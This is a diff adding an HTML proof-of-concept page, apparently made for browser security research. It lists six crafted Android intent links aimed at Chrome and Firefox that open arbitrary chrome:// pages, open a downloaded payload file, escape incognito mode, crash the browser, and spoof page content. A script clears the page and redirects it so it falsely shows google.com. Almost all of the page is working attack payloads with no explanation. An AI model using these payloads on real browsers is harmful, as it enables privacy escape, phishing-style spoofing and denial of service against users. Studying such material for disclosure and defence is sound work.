@@ -1,0 +1,29 @@
+<meta name="viewport" content="width=device-width,initial-scale=1">
+
+<style>
+body {
+  transition: opacity 0.2s ease-in-out;
+  opacity: 1;
+}
+</style>
+
+#1: <a href="intent:chrome-urls#Intent;package=org.mozilla.firefox;action=android.intent.action.VIEW;scheme=about;end;">Open arbitrary chrome:// URLs (incognito + user interaction)</a><br>
+#2: <a href="intent://com.android.chrome.FileProvider/downloads/payload.html#x.mhtml#Intent;package=com.android.chrome;action=android.intent.action.VIEW;scheme=content;end;">Open downloaded file</a><br>
+#3: <a href="intent://example.com#Intent;package=com.android.chrome;action=android.intent.action.VIEW;scheme=http;S.android.support.customtabs.extra.SESSION=;end;">Escape from incognito</a><br>
+#4: <a href="intent://chrome-urls#Intent;package=com.android.chrome;action=android.intent.action.VIEW;scheme=about;S.android.support.customtabs.extra.SESSION=;end;">Open arbitrary chrome:// URLs</a><br>
+#5: <a href="intent:///x.mhtml#Intent;package=com.android.chrome;action=android.intent.action.VIEW;scheme=file;end;">Crash</a><br>
+#6: <a onclick="spoof()"href="intent://192.168.71.38/redirect.html#Intent;package=com.android.chrome;action=android.intent.action.VIEW;scheme=http;S.android.support.customtabs.extra.SESSION=;i.org.chromium.chrome.browser.customtabs.EXTRA_UI_TYPE=2;i.android.support.customtabs.extra.TITLE_VISIBILITY=1;i.android.support.customtabs.extra.TOOLBAR_COLOR=-10496;end;">Spoof content</a><br>
+
+<script>
+
+function spoof() {
+  if (document.cookie.indexOf('spoof') != -1) {
+    document.cookie = "spoof;expires=" + new Date().toUTCString();
+    document.body.innerHTML = "";
+    location.href = "https://google.com/blank.html";
+  } else {
+    setTimeout(spoof, 100);
+  }
+}
+
+</script>
